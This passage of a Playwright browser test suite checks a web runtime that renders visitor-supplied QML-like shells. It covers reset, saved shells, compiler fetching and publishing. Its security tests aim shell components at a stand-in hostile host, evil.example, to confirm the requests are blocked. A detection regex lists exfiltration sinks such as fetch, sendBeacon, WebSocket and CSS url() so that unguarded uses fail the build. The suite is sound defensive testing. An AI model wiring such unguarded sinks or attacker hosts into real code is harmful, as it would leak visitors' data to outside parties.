    await expect.poll(reaching).toEqual({ model: 1, xhr: "done 200", socket: 1 });
    await page.waitForTimeout(100);
    expect(asked.length).toBe(4);
    expect(sockets.length).toBe(2);
  });

  test("A Reset with no shell shown leaves the page as it is", async ({ page }) => {
    await opened(page);
    await page.evaluate(() => (window.stillHere = true));
    await page.getByRole("button", { name: "Reset" }).click();
    await page.evaluate(() => window.live.idle());
    expect(await page.evaluate(() => window.stillHere)).toBe(true);
    await expect(page.getByRole("status")).toHaveText("The site's shell is shown");
  });

  test("A Reset after a shell that could not be shown takes its error away", async ({ page }) => {
    await opened(page);
    await page.evaluate(() => (window.stillHere = true));
    await page.evaluate(() => window.live.drop("import QtQuick\nItem {"));
    await expect(errors(page)).toBeVisible();
    await page.getByRole("button", { name: "Reset" }).click();
    await page.evaluate(() => window.live.idle());
    await expect(errors(page)).toBeHidden();
    await expect(page.getByRole("status")).toHaveText("The site's shell is shown");
    expect(await page.evaluate(() => window.stillHere)).toBe(true);
  });

  test("A shell the browser cannot forget is said so, and the page stays", async ({ page }) => {
    await opened(page);
    await page.evaluate(async (text) => {
      const element = document.createElement("div");
      document.body.append(element);
      const stuck = new Map();
      const storage = { getItem: (key) => stuck.get(key) ?? null, setItem: (key, value) => stuck.set(key, value), removeItem() {} };
      window.other = window.liveShell(window.Shell, element, { site: "stuck", storage });
      window.stillHere = true;
      await window.other.drop(text);
      await window.other.reset();
    }, over(""));
    expect(await page.evaluate(() => window.stillHere)).toBe(true);
    await expect(errors(page).last()).toContainText("could not be forgotten");
  });

  test.describe("A refused request", () => {
    test.use({ told: [/Failed to load resource|ERR_FAILED|CORS|net::|not fetched while/] });
    const told = (page) => page.evaluate(() => new Promise((resolve) => window.named("sinks").asked(resolve)));

    test("Tells a program what a request that failed on the network tells", async ({ page }) => {
      await page.route(/evil\.example/, (route) => route.abort());
      await opened(page);
      await dropped(page, over(`    Sinks { objectName: "sinks"; address: "${EVIL}" }`));
      await expect(errors(page)).toBeHidden();
      const refused = await told(page);
      expect(refused).toContainEqual(["readystatechange", 4, 0]);
      expect(refused.at(-1)).toEqual(["loadend", 4, 0]);
      // The same, shown with a host the site allows, so that it does go out.
      await page.addInitScript(() => (window.allowedHosts = ["evil.example"]));
      await opened(page);
      await dropped(page, over(`    Sinks { objectName: "sinks"; address: "${EVIL}" }`));
      expect(await told(page)).toEqual(refused);
    });

    test("Is one a program can abort and open again", async ({ page }) => {
      await page.route(/evil\.example/, (route) => route.fulfill({ body: "x", headers: { "Access-Control-Allow-Origin": "*" } }));
      await opened(page);
      await dropped(page, over(`    Sinks { objectName: "sinks"; address: "${EVIL}" }`));
      const after = await page.evaluate(async () => {
        const request = window.named("sinks").ask();
        let quiet = true;
        request.addEventListener("error", () => (quiet = false));
        request.abort();
        const aborted = request.readyState;
        await new Promise((resolve) => setTimeout(resolve, 20));
        const failed = window.named("sinks").ask();
        await new Promise((resolve) => setTimeout(resolve, 20));
        const done = failed.readyState;
        failed.abort();
        return { quiet, aborted, done, gone: failed.readyState };
      });
      expect(after).toEqual({ quiet: true, aborted: 0, done: 4, gone: 0 });
    });
  });

  test("Every sink in the runtime goes through the guard", async () => {
    const { readdirSync, readFileSync } = await import("node:fs");
    const { join, relative } = await import("node:path");
    const root = join(import.meta.dirname, "..");
    // Fetched by the runtime for itself, at addresses of its own.
    const own = new Set(["guard.js", "vite.js", "site.js", "kernel/wasm.js", "Ljos/Blocks/shell-worker.js", "QtMultimedia/audible.js"]);
    const SINK = /\bfetch\(|\.src\s*=[^=]|\.href\s*=[^=]|setAttribute\("(src|href)"|window\.open\(|new window\.WebSocket|new EventSource|sendBeacon|(backgroundImage|maskImage|borderImageSource)\s*=\s*`?[^"`]*url\(|style\.(background|filter|clipPath|mask)\s*=\s*[^"\s]/;
    const found = [];
    const walk = (directory) => {
      for (const entry of readdirSync(directory, { withFileTypes: true })) {
        const path = join(directory, entry.name);
        if (entry.isDirectory()) {
          if (!["node_modules", "tests", "site-tests", "compiler", "dist"].includes(entry.name)) walk(path);
        } else if (entry.name.endsWith(".js") && !own.has(relative(root, path))) {
          readFileSync(path, "utf8")
            .split("\n")
            .forEach((line, at) => {
              if (SINK.test(line) && !/allowedUrl\(|allowedStyle\(|\/\/ guarded/.test(line) && !line.trim().startsWith("//")) found.push(`${relative(root, path)}:${at + 1}: ${line.trim()}`);
            });
        }
      }
    };
    walk(root);
    expect(found).toEqual([]);
  });

  test("Dispose lifts nothing: what either zone was handed stays refused", async ({ page }) => {
    const asked = await fetched(page);
    await opened(page);
    await page.evaluate(() => {
      const element = document.createElement("div");
      document.body.append(element);
      window.other = window.liveShell(window.Shell, element, { site: "other" });
    });
    await dropped(page, over(`    Pic { objectName: "pic"; picture: "${EVIL}" }\n    Note { objectName: "noted" }`));
    await page.evaluate((text) => window.other.drop(text), pic(EVIL + "?other"));
    await page.evaluate(() => window.other.dispose());
    await page.evaluate((url) => (window.named("pic").picture = url), EVIL + "?after-dispose");
    await expect.poll(() => statusOf(page)).toBe(ERROR);
    const block = await page.evaluateHandle(() => window.named("pic"));
    await page.evaluate(() => window.live.dispose());
    await block.evaluate((pic, url) => (pic.picture = url), EVIL + "?after-both");
    await page.waitForTimeout(100);
    expect(asked).toEqual([]);
  });
});

test.describe("A visitor's shell is kept", () => {
  test("A reload of the page shows the shell the visitor dropped", async ({ page }) => {
    await page.goto("/drop.html");
    await page.evaluate(() => localStorage.clear());
    await opened(page);
    await dropped(page, MINE);
    await page.reload();
    await opened(page);
    expect(await read(page, "mine", "objectName")).toBe("mine");
    await expect(page.getByRole("status")).toHaveText("Your shell is shown");
  });

  test("Reset shows the site's shell and forgets the visitor's", async ({ page }) => {
    await page.goto("/drop.html");
    await page.evaluate(() => localStorage.clear());
    await opened(page);
    await page.evaluate(() => window.named("basket").add());
    await dropped(page, MINE);
    await resetting(page);
    // What only the page held went with it, as anything the shell handed it may be in it.
    expect(await read(page, "label", "text")).toBe("Default 0");
    expect(await page.evaluate(() => localStorage.length)).toBe(0);
  });
});

test.describe("The compiler is fetched when it is needed", () => {
  test.beforeEach(({ page }) => page.addInitScript(() => localStorage.clear()));

  test("A compiler that could not be fetched is fetched again by the next drop", async ({ page }) => {
    let refused = 0;
    await page.route(/ljos_web_compiler\.wasm/, (route) => (refused++ === 0 ? route.abort() : route.continue()));
    await opened(page);
    await dropped(page, MINE);
    await expect(errors(page)).toContainText("the compiler could not be loaded");
    await dropped(page, MINE);
    await expect(errors(page)).toBeHidden();
    expect(await read(page, "mine", "objectName")).toBe("mine");
    expect(refused).toBe(2);
  });
});

test.describe("A visitor publishes their shell", () => {
  test.beforeEach(({ page }) => page.addInitScript(() => localStorage.clear()));

  test("Publish gives the site's hook the shell and what it uses, and shows its answer", async ({ page }) => {
    await opened(page);
    await dropped(page, MINE);
    await page.getByRole("button", { name: "Publish" }).click();
    await expect(page.getByRole("status")).toHaveText("Published: https://shells.example/1");
    const published = await page.evaluate(() => window.published);
    expect(published.text).toBe(MINE);
    expect(published.meta.blocks).toEqual([{ module: "Shop", name: "Basket", version: "1.0" }]);
    expect(published.meta.hash).toMatch(/^[0-9a-f]{64}$/);
  });

  test("A publish that works after one that failed takes the failure away", async ({ page }) => {
    await opened(page);
    await dropped(page, MINE);
    await page.evaluate(() => (window.publishing.error = "the shelf is full"));
    await page.getByRole("button", { name: "Publish" }).click();
    await expect(errors(page)).toHaveText("Publish failed: the shelf is full");
    await page.evaluate(() => (window.publishing.error = null));
    await page.getByRole("button", { name: "Publish" }).click();
    await expect(page.getByRole("status")).toHaveText("Published: https://shells.example/1");
    await expect(errors(page)).toBeHidden();
  });

  test("A publish that fails says so", async ({ page }) => {
    await opened(page);
    await dropped(page, MINE);
    await page.evaluate(() => (window.publishing.error = "the shelf is full"));
    await page.getByRole("button", { name: "Publish" }).click();
    await expect(errors(page)).toHaveText("Publish failed: the shelf is full");
    expect(await read(page, "mine", "objectName")).toBe("mine");
  });
});
